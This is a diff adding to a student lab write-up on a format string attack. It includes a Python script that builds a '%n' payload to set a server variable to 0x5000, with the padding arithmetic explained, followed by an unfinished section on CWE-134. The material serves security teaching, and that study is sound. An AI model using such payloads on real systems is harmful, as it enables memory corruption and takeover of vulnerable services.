@@ -126,3 +126,61 @@ The target variable's value is now 0x0000012e, instead of the original value of 
 
 #### 3.B
 
+This time, the value of the server's target variable needs to be changed to exactly 0x5000. Converting that value to decimal, we get 20480. So, our input will need to print 20480 characters before "%n".
+
+
+We opted to use "%.8x" this time, instead of ".%x" to make sure we always print exactly 8 bytes each time. However, the address and 62 * "%.8x" is not enough to get to 20480 characters, we are still 19980 (20480 - 4 - 62*8 = 19980) characters short. So, we used "%19980x" to print the rest of the characters as blank spaces.
+
+
+```py
+import sys
+
+
+target = 0x080e5068
+
+
+output = b""
+
+
+output += target.to_bytes(4, byteorder='little')
+
+
+output += b"%.8x" * 62
+
+
+output += b"%19980x"
+
+
+output += b"%n"
+
+
+with open("task3B.bin", "wb") as f:
+    f.write(output)
+
+
+print("output criado")
+```
+
+
+Once more, we used cat to send the file with the payload (task3B.bin) to the server:
+
+
+![3B-sent](Images/3Bsent.png)
+
+And the server output was the following:
+
+![3B-received1](Images/3Breceived1.png)
+![3B-received2](Images/3Breceived2.png)
+
+The value of server's target variable was succesfully changed to 0x5000.
+
+## Question 2
+
+"CWE-134: Uncontrolled Format String" happens when data given by the user is passed the format string argument to a standard library function, such as printf(), which allows attackers to inject format specifiers like the ones we've been using ("%s" and "%n" for example) to control stack access.
+
+### Does the format string always have to be allocated on the stack for the vulnerability to exist?
+
+
+
+
+### Of the tasks performed, which attacks would not work if the format string were allocated on the heap, and why?
